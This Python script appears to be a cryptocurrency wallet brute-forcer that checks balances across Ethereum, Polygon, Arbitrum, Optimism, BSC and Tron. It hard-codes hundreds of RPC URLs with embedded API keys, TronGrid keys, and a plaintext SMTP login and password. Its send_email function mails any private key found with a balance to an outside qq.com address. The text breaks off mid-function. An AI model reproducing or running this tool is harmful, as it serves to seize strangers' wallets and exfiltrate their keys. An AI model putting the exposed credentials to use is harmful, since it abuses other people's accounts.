import json
from concurrent.futures import ThreadPoolExecutor
from web3 import Web3
import requests
import smtplib
from email.mime.text import MIMEText
from typing import Optional
from eth_account import Account
from tronpy.keys import PrivateKey
import secrets
from typing import Union
from flask import Flask

app = Flask(__name__)


rpc = [
    'https://eth-mainnet.g.alchemy.com/v2/x14ZN848Mqzuci7q4M6iEjRW5ExYwDxR',
    'https://eth-mainnet.g.alchemy.com/v2/f64RUDU7aONDB95mFYVwDRdLNQmGVUNs',
    'https://eth-mainnet.g.alchemy.com/v2/QSHeRLJfjIpD2w-GIWjcxW3sXkqW1ZAU',
    'https://polygon-mainnet.g.alchemy.com/v2/lpECxrSl0BIDkb9ITQYih6eJLFl0ooif',
    'https://polygon-mainnet.g.alchemy.com/v2/W6PPsxn1nMYXLNiLsFX4R_9tNhbSvSMb',
    'https://polygon-mainnet.g.alchemy.com/v2/3yM7Ferx84BCZZ4r8co9eIY6jmJ95Hzn',
    'https://opt-mainnet.g.alchemy.com/v2/etdz3cbyg0upgTfZwn-X_gpmNWmljC58',
    'https://opt-mainnet.g.alchemy.com/v2/d6hUi2ry2FUm_M0OKRMG4uPMbcgIktgD',
    'https://opt-mainnet.g.alchemy.com/v2/qqml2QcnjKGEU1GdS_-C-GIWqXyvZsvZ',
    'https://arb-mainnet.g.alchemy.com/v2/KOmkgPDzWa_anroyQ_JMikiHd6aWuB_a',
    'https://arb-mainnet.g.alchemy.com/v2/sSPB8Y-qBouab4xZ2K3gAnCex39kEKs1',
    'https://arb-mainnet.g.alchemy.com/v2/LJHQYkQAJlToNlf0WrQwPIVUR-psFkqd',
    'https://rpc.ankr.com/bsc/7023d316f98b01edd40def04232585411b31690b71e0afe3848c13b4e49e0564',
    'https://rpc.ankr.com/bsc/88ed1a17b31250f420528f59f2e1247eb213eefe1184b8ad63ea3f5dc580ca4c',
    'https://bsc-mainnet.nodereal.io/v1/4eab914d471d48b0abdd3d5753aab563',
    'https://rpc.ankr.com/bsc/f8fa4c5b4426605d47297d8b4722e2e6b51bdcdc1f823f5ebe1b32efd1a298a4',
    'https://rpc.ankr.com/bsc/7b4bcd22f0bdfa63975b6a59cd8b9569dd7106bb9cc6eed4cc9c92f8b32f10a1',
    'https://rpc.ankr.com/polygon/ecaf8e9afaca1f11398aaf44898652556782383e151e7808b8f38e84f6992b0f',
    'https://rpc.ankr.com/polygon/da1bd638f80158c3079c468ae58bb0ded78263efe48d0930eaa29608fc47d8a3',
    'https://rpc.ankr.com/polygon/7ff3f47f122baee0c72acfe0c3ec256b5a856814e51f85f99136c7fa44e40d9a',
    'https://rpc.ankr.com/polygon/2120552998bd79221a18917ef2d9b373cb81fa2c6046f2b9d5749605ab2e3dbd',
    'https://rpc.ankr.com/polygon/d3c9c17f7ad259c5512b16126da469cbfbfdb70cb59a78d0753690f85301c502',
    'https://rpc.ankr.com/polygon/c24dc0fbed162f73da820e087dcbaae85a871f6096264db0c3e5ab0afab551fb',
    'https://rpc.ankr.com/polygon/e3c8ff994cc67fcd8b543d74c915a7ebc608a3c4834551c134b7f2cd6b560f19',
    'https://rpc.ankr.com/polygon/225e7a08cc8150b2dc625c7cbf46894a40b2f9b684dcb0053c2230bece3eb088',
    'https://rpc.ankr.com/polygon/23e4141bbb5dc3894efbd8ec6df3fcd50f3c4d9731a939b4d65bca2d8580d542',
    'https://rpc.ankr.com/polygon/929350c0b4856726cb68b1667365a7b3e0df503a4dd75232321417c2883dfa34',
    'https://rpc.ankr.com/polygon/18343e7aa88fcaf4f2456f706ec81acf303866337f15e3adc26d904550660946',
    'https://rpc.ankr.com/polygon/c7568a34dd5a94f2fe1489ecf314bd8cb9cc9c32993f112e42883c00284fcfbf',
    'https://rpc.ankr.com/polygon/6ae9852fb5fb67be7c19ca22a7af4acd3c8eaed28828659ea035d1b481fcbf62',
    'https://rpc.ankr.com/polygon/2d17d6fc94209ed6f7bca576fdd2a07ba56637ca7b0eb7fd643561dc14794ccd',
    'https://rpc.ankr.com/polygon/e89ce2aed50dad4e383a33ebdeb6cb565c6d49c62fdd919b2c96a1186769e13a',
    'https://rpc.ankr.com/polygon/eb666f2554076535ab9056ec67d5fe4b148c1e1ae21c6a75d24b54253eade31f',
    'https://rpc.ankr.com/polygon/fedb82a1aedcb8d1b2e2066f1a23753ce716036044b220a6fc1821ae0b3af148',
    'https://rpc.ankr.com/polygon/c5d8ce71fc2ade439e24a4f862e273789ba2e1e9df2e53def3a61a3a52728eaa',
    'https://rpc.ankr.com/polygon/cd46e2e40709d2f010c6559659f41455b83928dd8b3281fd449bcf8e51c74e03',
    'https://rpc.ankr.com/polygon/a45a11c7799451c857cbfd85b9d214b14cb601bc18aceb0111e789ed34708ba7',
    'https://rpc.ankr.com/polygon/ee82198e51c63cbbc18a14355a79e63e2f41afc361b84607d87c2837f77416b4',
    'https://rpc.ankr.com/polygon/ff0e2fb36a1c98988d319eb1032591b2a236cbe21cee56e33922e3ec17f35eff',
    'https://rpc.ankr.com/polygon/bf564ca6b8a5ad29083d9801520d01837d0448adf824e2834568d9bd58304659',
    'https://rpc.ankr.com/polygon/87280bd193ad5db661c6cfce935aebd4974e7c54c516391d5382115a8214280d',
    'https://rpc.ankr.com/polygon/22f1562e0ddb7a7da0f3d0aca524a5a5acedb31b9d30bced95c47ee9e7d6067c',
    'https://rpc.ankr.com/polygon/d56afe8f7429cba8ea14a2ecae657210fecb1b636c4e2aabf3b556a5d132f03a',
    'https://rpc.ankr.com/polygon/d226c30a3ff8186aaa358748cc0cbadee4519e40c1f2fedaff1ddccaa9271528',
    'https://rpc.ankr.com/polygon/d5c6c3fc89f847509ef1689b85eef8da28764823b23b7449b03a5e8df7e860ee',
    'https://rpc.ankr.com/polygon/bf3eb3e76b2ebaa0a74cab217c9e3d0d219a536c510a2977a753c01f3dd1a1dc',
    'https://rpc.ankr.com/polygon/1c46636eaeaecf69446c73d3c25ed7fdb5beb9073107598a19079831e0bb0488',
    'https://rpc.ankr.com/polygon/e296e9288b9939da08dc68558ae2ff1d774e8e420851f1366c4bc468de406573',
    'https://rpc.ankr.com/polygon/8f998f7dd9651b05fd9b6c34e1330c19ecdf5ed5b299f455e144c241e375aee1',
    'https://rpc.ankr.com/polygon/349b17b8b882f759a1ebccdb99a1c51a9a3f0097dc45d37c67289329a3f84274',
    'https://rpc.ankr.com/polygon/39a412a91b4b489958d07eb3c441e5490042a6e9aa739ce13e14a78971b04b95',
    'https://rpc.ankr.com/polygon/688e44c7f08c398016b1e0799fb06d803b3a43414f2dcc498f448526c261e710',
    'https://rpc.ankr.com/polygon/80cf4a5b56ea4f26af9cf0cc1ad5b1fb9b856910dc8d96bbe6cabfaa83f2b8b1',
    'https://rpc.ankr.com/polygon/d654ee934efc11acdefde50b0fb5d845b482e7df512b735ff029689ac74fb3bd',
    'https://rpc.ankr.com/polygon/679ba2d6b36cdbcf5385afff7572bb52bc28bbb1b8915a946c4b8382ba1156ac',
    'https://rpc.ankr.com/polygon/b939ce60316a7e76283c17e9f647e2df27d81155bb671d457dc76157adb7beb1',
    'https://rpc.ankr.com/polygon/9804fd8c3c191c69e736de3a6587a69ce1f97e7542a6ffc3b6e6e168a43ceb2a',
    'https://rpc.ankr.com/eth/b0d022a0caf3e6167e1a4ca889f1ea50af2dd48926e1b14430ef50198b7e4247',
    'https://rpc.ankr.com/eth/c9741e8f30dcc65c7c370afd4abcd4f436a2618e5760b5007229ecc68df4e1eb',
    'https://rpc.ankr.com/eth/4a31d216d0393315ad57589317ac55d052951a6d13f38609cda1e8b7ce61dabb',
    'https://rpc.ankr.com/eth/aedc9a8715fef035b56220ffebf6f0343b97106cfc3d1bbbb44cc0eb015db7fd',
    'https://rpc.ankr.com/eth/da60de1e6d0e74c97a169f5b6869b4009ee3bbe824a05eb8a997e845d35ac7e0',
    'https://rpc.ankr.com/eth/3cba9e25db6301afb960ab5430a9d4941ebef9a3d17179bb0d6e72a6644c397b',
    'https://rpc.ankr.com/eth/e8f547b3ccb80406c2ddd3f1db4fa73ef1c12543efdcf3e3231ceba684596d05',
    'https://rpc.ankr.com/eth/be9645865b240ac111348eb2f32dcf52962633010997ad7e4ae52d35e274bac0',
    'https://rpc.ankr.com/eth/df78627f729f1208d0ca1e6a2bcafe3e0db1c1df5270c7bba52c06a00f67fdf6',
    'https://rpc.ankr.com/eth/56debf04ec2e4fbf840624dbf5eb73718aa0fbf948086c2aba4328525df3e4d8',
    'https://rpc.ankr.com/eth/c5c0cb3b5e823e6595625ab111bb4c90ecc407bef3c16d92d26ca2e685bc9570',
    'https://rpc.ankr.com/eth/0ca0909cfab3465ecb44405d77339e04bac92016a2d166e5f19e7661c3032a2c',
    'https://rpc.ankr.com/eth/5ad57ef28edc735986adeb24ed01911638d73c150152cfd05980ae3501465c7e',
    'https://rpc.ankr.com/eth/f7050c697500e07f3826ff0a07152de89119f9cc7a94b04e1e88ce268230fe50',
    'https://rpc.ankr.com/eth/5533d161dc717e420c22c3f251fd255a2525abf92a24fe9cc17f25cdbf39e663',
    'https://rpc.ankr.com/eth/64662073cd670d5df16a3360f7b45214a7b85cf0e37998b61f552586aa3dd605',
    'https://rpc.ankr.com/eth/fde7b371296cc58b55986bb678d914f31283db04f635cf38abeea8ffb93f3604',
    'https://rpc.ankr.com/eth/04987c71503d11f2720f73cb0f008368f0157fe677b1a92b3d5e98a0fdfae669',
    'https://rpc.ankr.com/eth/5f206d061c86f077f0e35422178cac420c86eb23da5509bdd69bab08d0b5c4e8',
    'https://rpc.ankr.com/eth/08d97c2f10d6377d2abe4484e4d6c7feaf26a0554e8093827871806cf3b828b0',
    'https://rpc.ankr.com/eth/474ee257c2162d1e65f53e471d6f4d86ac76712e4a37cdd33ace4ea66ec9f57d',
    'https://rpc.ankr.com/eth/e7837ef5e7e3864df8f0aab311862959742144e68afd470d372c6dc929033941',
    'https://rpc.ankr.com/eth/cf3af6a461c2af457c1d5d4212ce6864e9bb62a311606db803d210e3fc658b63',
    'https://rpc.ankr.com/eth/5b80421105a8bd7c8d99a43ec813db4a0fabe8dfeef27b135019d58d5b6c95a6',
    'https://rpc.ankr.com/eth/172b4078a3bf232a762bd7ba49227877bf22004cf786afba8364baf4c39aa2ab',
    'https://rpc.ankr.com/eth/be0fa30fa86cf0945bd2f4e945f2d8e79ab5a1b87728f9c9b9bca20184f503ac',
    'https://rpc.ankr.com/eth/67fe8d32cd65e16d726bf60723d46d2376d3eaa463d9d106cbdbb67d6d712be1',
    'https://rpc.ankr.com/eth/c26c4f2fa5d0803896beb8afe37afeeda3e877ca86b478460a621aeab39d0338',
    'https://rpc.ankr.com/eth/5a650a738845e3f2a15e21b42c1d3b4b2c614cd18d57eb41d4992b156a17def9',
    'https://rpc.ankr.com/eth/4071228c3733960b0fdb2ba73761fde8d2b2d438fe48e1013a2b1b52ba56cc29',
    'https://rpc.ankr.com/eth/b91183ab957098209a75b7a4edecd580284ff98613434ab0725aed295cefe518',
    'https://rpc.ankr.com/eth/da835d3abc99045fe80fd7d29e72c634f2db80d033cd829a403ebb4335aeac4f',
    'https://rpc.ankr.com/eth/cf50ddf54e0292ea5142b8ded68449292f267d0c0fd35e2da4aa6f32fc39045f',
    'https://rpc.ankr.com/eth/2619dca9a413ef7d8f1d343e7ded0079518cbf86dc3b4aea77abcff37ad0c1d1',
    'https://rpc.ankr.com/eth/770e7bf6ecb577ed0943fff8edf81973411c5c3b0e56c9080b3ef2a68fe95082',
    'https://rpc.ankr.com/eth/ffc47fb4d9ea13f27ac56ec0916d1071327aded0b4506bcb57cd77d127f699cf',
    'https://rpc.ankr.com/eth/14c796e9f9fd0c8ce7bbff386a577829dfcf3a913f00efa95639980ea3c5db88',
    'https://rpc.ankr.com/eth/75e16c4baae8750019fe4dfe81d3be8c554caa679d71b78d3854ab4d9b339d37',
    'https://rpc.ankr.com/eth/fcaf694e4accfb306446ad690c04b751106bff960c2551fec7e0c5756fd13438',
    'https://rpc.ankr.com/eth/77ba7352427c23d0b00edeaad73a536f50713fc2ceda57f1f617cf7722ec62c8',
    'https://rpc.ankr.com/arbitrum/bb4b3311d3dcb6ab885cccacb676954f2edef736204470bf654f7834570bec10',
    'https://rpc.ankr.com/arbitrum/4481c1c41cfb7097fe178289e9b406ab679ef6ad3850d60d1c343bf0277aa335',
    'https://rpc.ankr.com/arbitrum/0e75288a7bee51ebf5b52fb03a0993674900d3bf1f7032fc607188cd56c61849',
    'https://rpc.ankr.com/arbitrum/95d1b63a54ed85e2cfa1e6c7c4f54264d9d261dfa5c70e6c323245d8c1019e4f',
    'https://rpc.ankr.com/arbitrum/adc774120018c26999bf3d6a027b4969fd165364316651ed1d251c0a3a58dceb',
    'https://rpc.ankr.com/arbitrum/aaec6d4afebc0903e218499d1936c4f2e9d755239551ae27a2cce0be154c2ce8',
    'https://rpc.ankr.com/arbitrum/2a364058c4a2ff9faae33b56aa6f6bfd9b71294b62cce2f67f8b7adb9bddbe00',
    'https://rpc.ankr.com/arbitrum/1096b45320a359c3a2850670f65e97d5fc59f677a1aacac798cfd1bc3fd2c606',
    'https://rpc.ankr.com/arbitrum/c5b85db7685abe2dd48fdbaeb44eabe656afb4b5838692b97817cd530d14222e',
    'https://rpc.ankr.com/arbitrum/ae0d19fcf1057b7f958d7f72a7f9258400cd1b8bd6a32c002bcf455167d09893',
    'https://rpc.ankr.com/arbitrum/07e2e427d8a3ac93e09524f70073921f67e46126231757163ec3cde0d269a0d2',
    'https://rpc.ankr.com/arbitrum/1d4f06a35fc0b80f425c31ed377c34aa44c999de1e8dc83af349b6bfd9ebd4be',
    'https://rpc.ankr.com/arbitrum/85281b5b83c12e83429f0ba6a98d98c7239e84319726afc99d6ce6c7e10dfc7a',
    'https://rpc.ankr.com/arbitrum/ad479278d27f776a566629a1961095ef09a5c9841ee152a996ca9232b4272536',
    'https://rpc.ankr.com/arbitrum/032f296818aa740b275d284a0d6e9e76188a840b4b707020394ace8e0c5c82f2',
    'https://rpc.ankr.com/arbitrum/36a6d28ea7d9e822d5a9192a9135002a0ee00d4196321825b6a9f856b90fe4ef',
    'https://rpc.ankr.com/arbitrum/fd26bb99cc748471ec5fb6d950e09ac7dba696aedc21c196961a6d4ef75ebb77',
    'https://rpc.ankr.com/arbitrum/9a10d4ba1e2491fae994b941a878bb88c32f9640c81c03547f2598ef903bfd25',
    'https://rpc.ankr.com/arbitrum/57490fa2d059ebd45bee18056ce54e07ab13fbd94f6f08e5339f857734a814f8',
    'https://rpc.ankr.com/arbitrum/5afa4a5bfee9614016dc68baa1bf2ee2b57d8a04f1df38e422a70b509ac53377',
    'https://rpc.ankr.com/arbitrum/a6204479b39b57946f1583f0c91a039a570588cfd7ac7b44769e33f739a391f6',
    'https://rpc.ankr.com/arbitrum/b2d3618081d379da813d791fd7c7a1e039092f9835dc86438d993a26c2964355',
    'https://rpc.ankr.com/arbitrum/3339b44c72ea7caf5cc1ab88b94aa2c4f1d5449e956185803d82379ee0076416',
    'https://rpc.ankr.com/arbitrum/4683c3867c3c363db6e0c3e5ee85d3dd9af178562b923140be4f304a7f12e8d7',
    'https://rpc.ankr.com/arbitrum/63a6c4a560e54219c0e8a9a09604edadfff33faa70b02e110bc7d6a09bcca105',
    'https://rpc.ankr.com/arbitrum/73d01171cdfcb861950abe4c9a8d53c01e7abf4fe85b3fd3961b7c1cd1ebe76f',
    'https://rpc.ankr.com/arbitrum/dd0e1b01ab457355bb7e75605c968a191e560f7e980660e9265c9b36158abfbc',
    'https://rpc.ankr.com/arbitrum/f51045ea9373cb97d19dccc6becb32e9d2fe2476db4d58f18fc72dc511c159a3',
    'https://rpc.ankr.com/arbitrum/5493121286d772689e1af6505cfcd07686b83a219f3bf25cc77ef08a169e354d',
    'https://rpc.ankr.com/arbitrum/c4531e1c8c88fa6cbeb16ca89465d43e75bcb2ba1bcc3327e6fa210a7b1ba056',
    'https://rpc.ankr.com/arbitrum/7310909da5f82379465e396f8da722b2b654e3d8e246e39cc770dab8a091c278',
    'https://rpc.ankr.com/arbitrum/c6b4830ef5b69af029e6eb8d5ac37604a53b1f2b1490d5a87d3857cb84d5f8a5',
    'https://rpc.ankr.com/arbitrum/fa62d10b356a7d1a4cad5e6dde308ec7ce23738f21a68317ce3af19adc291925',
    'https://rpc.ankr.com/arbitrum/54977db0b452609c1ffd2e39890fe7340ef1d15c4f47f51bb7b3c3d51da6587b',
    'https://rpc.ankr.com/arbitrum/2413effcdb1d88149b917224b8294e6255ed34bfcfe3ef2c02b8648dc3c62b1c',
    'https://rpc.ankr.com/arbitrum/ba89599ac5065c1b4f7bc5a522bc296f6414846e4cd6f9f905b0031954248bd1',
    'https://rpc.ankr.com/arbitrum/c00afe6b05ce87cab31d0e9de4ca14210272fecb2bc33e2cefa1ed7960a5ab15',
    'https://rpc.ankr.com/arbitrum/30347015641cfb2a68fdf0ef04ef45d0eb04eba948d30135eec666117a88d1e7',
    'https://rpc.ankr.com/arbitrum/ce0b2257714acc6fb17eaa4046db2cb5c983e730a7e7aa302019e52e76203ca0',
    'https://rpc.ankr.com/arbitrum/62346c0a455c21126d97e384b8b2c907a0ca67c46ab3cb05ac71bcd81a3872a1',
    'https://rpc.ankr.com/optimism/57e028d3f948ae9e0695da64e905a0a2583d34b3803bc7aef7bee6e728ded093',
    'https://rpc.ankr.com/optimism/fd6abe30667c380117ace18cd6f8b528eb5a750bfafd260f4c6ed3c3c4b50e67',
    'https://rpc.ankr.com/optimism/da40b43eb593b46f953b281c3b22d511dc7e733709548f0585f881f67e674268',
    'https://rpc.ankr.com/optimism/b9b58fe4697bed522a95fbe68159f64ba35ceed19051a7c4af3aca40577395dd',
    'https://rpc.ankr.com/optimism/4d9b7a17b63036ae480e01e8b3b86832bbafda834c029002c2fd9a2d231754da',
    'https://rpc.ankr.com/optimism/0a5881e7d180097c440730e33842fe1a9ab48997ae6cfbf3c911a9a941390b54',
    'https://rpc.ankr.com/optimism/2299c2e14e6fad13ff31b4031ccbdb38f25043fda0ec68374ae79f8284d86c9e',
    'https://rpc.ankr.com/optimism/3f91710444bb228c9cc0b99718b9ca3ff0e86997bb254ba5da46c97e57419e23',
    'https://rpc.ankr.com/optimism/af4b942a0036be2bae4d1c2e2e806d70f7146a4afd2b505ea54fceac46779277',
    'https://rpc.ankr.com/optimism/5fe75667b30aff6421b1f76baf997022001f3f3817232acb71a4c316814bd791',
    'https://rpc.ankr.com/optimism/e6f84c9890582bf02855e097826fd251d0f069243f247990b52e76b75fc4d648',
    'https://rpc.ankr.com/optimism/89fb200bca46fd747061e6e4f435ecb7784a22725ef54a718ccdbe4498a35505',
    'https://rpc.ankr.com/optimism/d74392d47e77d45ee219186ff3a5b92d183067ac229dd1bbb2d3cf55b41910d2',
    'https://rpc.ankr.com/optimism/f82ca50b0fa384e48d6f1ec6e003e349b32684af56e5b488fcadae6ec7c21fe1',
    'https://rpc.ankr.com/optimism/4c9aa803f8b5cb995d5590af61968a8994db56de01e9f28c3a6d6f93ccac1a4e',
    'https://rpc.ankr.com/optimism/53f2a0f6626912918a3759f8cb1b811f9fe431f6b18e11347a218f4c17f7d197',
    'https://rpc.ankr.com/optimism/51b79ddbcaa38d8a84f19ee0d28c3247b361b3b40eb4ce0a6ca898a8482048ae',
    'https://rpc.ankr.com/optimism/ae37b5cc1df7739cb1bcbbffede6d74bace179490d665b8a9a1ce23c7b5a1467',
    'https://rpc.ankr.com/optimism/6ae03934e2c1e595ccaf30405eafd92810159bf4beb3e6c4178caeb8da861c25',
    'https://rpc.ankr.com/optimism/99f9c408f3638c2bdd98da7b81e0cc8a519a33a638bdb3146b47044c86309c65',
    'https://rpc.ankr.com/optimism/64deb44fca1349bdf152e97c84355cad29c49e598ceba868b6c3e5866820052e',
    'https://rpc.ankr.com/optimism/643149788af9e9e6306a9e835b19c6e8d4832dabef3cbb0f9fcf17a7f433304c',
    'https://rpc.ankr.com/optimism/682d5c9b49add72e6e75b67fa5c8ae4cabfad9cd402ba14e31d590a334a3f012',
    'https://rpc.ankr.com/optimism/42eaa146d4fa71a97e0cb0274547870bd63d1285bc749f054d4c8e39536d3fed',
    'https://rpc.ankr.com/optimism/1dc0a837ef56298300b96300eaa8408ebbe79667f455bc55e04e045c77549d84',
    'https://rpc.ankr.com/optimism/685f927979884f0a15135f96bcda8df639bb53528ef4fa25bff9556817547b91',
    'https://rpc.ankr.com/optimism/c84a4b056419748f8071cd6796f26d2d4cd2fee2016ec77238f44daa5ccab5dc',
    'https://rpc.ankr.com/optimism/4596511f7250afaa3d72e16122356d656a86021eb1f174b669131c5e29db9a54',
    'https://rpc.ankr.com/optimism/3a64f1d4ac498ee72797b771db2fc3c35b96505e47a3512229e2e9d68c3692a2',
    'https://rpc.ankr.com/optimism/6e14051706eb7ad50796e2061b4e7385cd1d364abb097abbfc6ba3726ab96151',
    'https://rpc.ankr.com/optimism/91dcc509f0fee8eebff17ac7ae28dee4139ee98fda19ccc149d020217d263962',
    'https://rpc.ankr.com/optimism/cce8841e80698e463830c1a0abbeaec158e14522bcdb9c8a64c4e9884a002129',
    'https://rpc.ankr.com/optimism/05e0a3dd906fad16ee8ab42168290527b469573211d59de34a09a8b3aa442f5b',
    'https://rpc.ankr.com/optimism/1355ea475624a238c80403eea4de98042c3e32bfc56cd33d71eb213c6718230e',
    'https://rpc.ankr.com/optimism/fd6c134e724ea132a9cd71d70b35554f0945ca3874f4ceb249e5aa4c600852cf',
    'https://rpc.ankr.com/optimism/2257222b176d00bc94be71f9e2cba117f2c930288ff68c38248cadac29013966',
    'https://rpc.ankr.com/optimism/cbc27915daf817ae337594a6240a28eb20c7c2f7e4ebbd3ba2ea90e9fc5a3ab9',
    'https://rpc.ankr.com/optimism/6b7df85d1f7c52a1914477589982437bb8759dae6af29646c734f3a6d3d83620',
    'https://rpc.ankr.com/optimism/6d32d2127f3de8eea2bd5bea2f838ed425c0b3af0eba802c8bb3518e66579cd6',
    'https://rpc.ankr.com/optimism/ab8ccedcb0538721b22bd0dfe975d90207a45597f2d254e94d54ca19c00413b7',
    'https://rpc.ankr.com/bsc/b0efe87c14a8d161fd7f75c8b43e80d68b3d51a9c16091bfa62f8ea2958102a9',
    'https://rpc.ankr.com/bsc/42cfb5d160fb187a368e87c442ff3d5f56ba5bc311d3a210ee7bb076fba3cda5',
    'https://rpc.ankr.com/bsc/992d965e2c9624291d82f49ad6a45256cceca86598aa337c0ff74ba7f1fa9b55',
    'https://rpc.ankr.com/bsc/3cd73a9d3327681b2ab7dac6f73f6a9f91d558acc214f56e2bf55fe54e1aa5d6',
    'https://rpc.ankr.com/bsc/afbd28f7e18cfc0b3aed74e19d76c060cac463e781bb3ac6a707cfb21db0945b',
    'https://rpc.ankr.com/bsc/91f4a861ec30e7bc58dfed57603d8b0e34dbf79fba8f7f0bb6104d4fe2d0211b',
    'https://rpc.ankr.com/bsc/d6a3b1cc7bf15dad6121916b47df4970eb09a1c616a93457aa34fbf0259e6eab',
    'https://rpc.ankr.com/bsc/77cf566056172bf6eefc4ec9e45512d6ab634409b0affc04e63ba0ef0b9f569b',
    'https://rpc.ankr.com/bsc/e8bb176c15803b8a873a4af7aa36686e7c17c0a02b8e5db0171e74e1ccebae06',
    'https://rpc.ankr.com/bsc/1e0c402e188929d329fcfad45d5d1fbaf8b0f846cb1e68d683436db77296c014',
    'https://rpc.ankr.com/bsc/7926aa61b8ab76acccd705079cf44e644fe0ee1cc98d1c86aedf707cd387f8a0',
    'https://rpc.ankr.com/bsc/c633ab74582c479d46ee34064bcfdb44d09d02b28a9d079f97557f3d54b2fe67',
    'https://rpc.ankr.com/bsc/4686e540b7b972bae8151a6fd1925425fe93d4c974ad7f9b13e4f4d765b5730e',
    'https://rpc.ankr.com/bsc/aa286a3589b44bc69ababce233bcf576a5532b3c536c5c04e40c0c44894e9bef',
    'https://rpc.ankr.com/bsc/b1d10a151c59f3aa581769538827e8f08106bb268650876152b5de19f0737868',
    'https://rpc.ankr.com/bsc/9ec15a9ef72122fd3b94bbb9585f4fc4d85858f2aa86f6127919459d7cef1cd7',
    'https://rpc.ankr.com/bsc/c5bae247f216c1689fc7554bd763718fa2623c1c0c0838cb80af2845afd575ae',
    'https://rpc.ankr.com/bsc/8a4a1a07460c47a0a337a636dde85ecafabfcb32e72874eca86917cf2aa2e376',
    'https://rpc.ankr.com/bsc/101449fe1003d9d98378a1772a5e5841d7672400eae560bf348ae6f1d2c07bbb',
    'https://rpc.ankr.com/bsc/abe73f5565da962f4cb1c068293040351a8ab6c9dbe4f2b7101d10209477aacb',
    'https://rpc.ankr.com/bsc/2fb8c287cc460df0ee39bcb6c8d7cf87b4d40c1e5cae24a02eb38e5c0258d8ff',
    'https://rpc.ankr.com/bsc/79aa1a7a10c6c94c5c954739b56e24cc9e8664dd0b284b32e2a5cec998ebce68',
    'https://rpc.ankr.com/bsc/fec0a49754dbc6f1f1217a14019577be8eba700da9d6e816ebe187fa496a518a',   
]

# 波场API列表
tron_apis = {
    'https://api.trongrid.io/v1/accounts/': 'c525a6c1-7b3d-4d43-ac01-cda2c07f9a90',
    'https://api.trongrid.io/v1/accounts/': 'bae02294-d84a-4d7f-82b2-85a6e8ee30d8',
    'https://api.trongrid.io/v1/accounts/': 'a2b8f849-1edf-46ac-b5b0-a5598eee9858',
    'https://api.trongrid.io/v1/accounts/': '174eeb0e-0e8b-455b-8ff2-dbb8d0bda47a',
    'https://api.trongrid.io/v1/accounts/': 'dfeac9ce-e575-40ce-9bb9-5365830c42b8',
}

# 用于rpc变量计数的
ethjs = 0
polygonjs = 0
arbitrumjs = 0
optimismjs = 0
bscjs = 0

# 用于计数的变量
counter = 1

# 邮件配置
smtp_server = 'smtp.qq.com'  # 邮件服务器地址
smtp_port = 587  # 邮件服务器端口
smtp_username = '240661955@qq.com'  # 发件人邮箱用户名
smtp_password = 'jbcwgrdqmfnzbjbf'  # 发件人邮箱密码
sender_email = '240661955@qq.com'  # 发件人邮箱地址
recipient_email = '373161734@qq.com'  # 收件人邮箱地址

def jxrpc(rpc):
    eth = []
    polygon = []
    optimism = []
    arbitrum = []
    bsc = []
    if rpc != '':
        for rpc in rpc:
            cc = rpc.strip()  # strip()方法用于移除行末的换行符
            if 'bsc' in cc.lower():
                bsc.append(cc)
            elif 'eth' in cc.lower():
                eth.append(cc)
            elif 'polygon' in cc.lower():
                polygon.append(cc)
            elif 'opt' in cc.lower():
                optimism.append(cc)
            elif 'arb' in cc.lower():
                arbitrum.append(cc)

    return eth, polygon, optimism, arbitrum, bsc

def send_email(private_key):
    message = MIMEText(f'Private key: {private_key}')
    message['Subject'] = 'Account with Balance Found'
    message['From'] = sender_email
    message['To'] = recipient_email

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(smtp_username, smtp_password)
            server.sendmail(sender_email, recipient_email, message.as_string())
        print('Email sent successfully!')
    except Exception as e:
        print(f'Error occurred while sending email: {str(e)}')

def get_eth_balance(address, eth):
    global ethjs
    if ethjs >= len(eth):
        return 0
    address = address
    eth = eth
    try:
        w3_eth = Web3(Web3.HTTPProvider(eth[ethjs]))
        address = Web3.to_checksum_address(address)
        balance_eth_wei = w3_eth.eth.get_balance(address)
        balance_eth = w3_eth.from_wei(balance_eth_wei, 'ether')
        return balance_eth
    except Exception as e:
        if '403' in str(e):
            ethjs = ethjs + 1
            return 0
        else:
            return 0

def get_polygon_balance(address, polygon):
    global polygonjs
    if polygonjs >= len(polygon):
        return 0
    address = address
    polygon = polygon
    try:
        w3_polygon = Web3(Web3.HTTPProvider(polygon[polygonjs]))
        address = Web3.to_checksum_address(address)
        balance_polygon_wei = w3_polygon.eth.get_balance(address)
        balance_polygon = w3_polygon.from_wei(balance_polygon_wei, 'ether')
        return balance_polygon
    except Exception as e:
        if '403' in str(e):
            polygonjs = polygonjs + 1
            return 0
        else:
            return 0

def get_arbitrum_balance(address, arbitrum):
    global arbitrumjs
    if arbitrumjs >= len(arbitrum):
        return 0
    address = address
    arbitrum = arbitrum
    try:
        w3_arbitrum = Web3(Web3.HTTPProvider(arbitrum[arbitrumjs]))
        address = Web3.to_checksum_address(address)
        balance_arbitrum_wei = w3_arbitrum.eth.get_balance(address)
        balance_arbitrum = w3_arbitrum.from_wei(balance_arbitrum_wei, 'ether')
        return balance_arbitrum
    except Exception as e:
        if '403' in str(e):
            arbitrumjs = arbitrumjs + 1
            return 0
        else:
            return 0

def get_optimism_balance(address, optimism):
    global optimismjs
    if optimismjs >= len(optimism):
        return 0
    address = address
    optimism = optimism
    try:
        w3_optimism = Web3(Web3.HTTPProvider(optimism[optimismjs]))
        address = Web3.to_checksum_address(address)
        balance_optimism_wei = w3_optimism.eth.get_balance(address)
        balance_optimism = w3_optimism.from_wei(balance_optimism_wei, 'ether')
        return balance_optimism
    except Exception as e:
        if '403' in str(e):
            optimismjs = optimismjs + 1
            return 0
        else:
            return 0

def get_bsc_balance(address, bsc):
    global bscjs
    if bscjs >= len(bsc):
        return 0
    address = address
    bsc = bsc
    try:
        w3_bsc = Web3(Web3.HTTPProvider(bsc[bscjs]))
        address = Web3.to_checksum_address(address)
        balance_bsc_wei = w3_bsc.eth.get_balance(address)
        balance_bsc = w3_bsc.from_wei(balance_bsc_wei, 'ether')
        return balance_bsc
    except Exception as e:
        if '403' in str(e):
            bscjs = bscjs + 1
            return 0
        else:
            return 0

def generate_tron_address(private_key):
    private_key_obj = PrivateKey(bytes.fromhex(private_key))
    address_tron = private_key_obj.public_key.to_base58check_address()
    return address_tron


def get_trx_balance(address):
    headers = {"Content-Type": "application/json"}

    for api, key in tron_apis.items():
        try:
            headers.update({'TRON-PRO-API-KEY': key})
            url = api + address
            response = requests.get(url, headers=headers)
            data = response.json()
            balance = int(data.get('balance', 0)) / 1000000
            return balance
        except Exception as e:
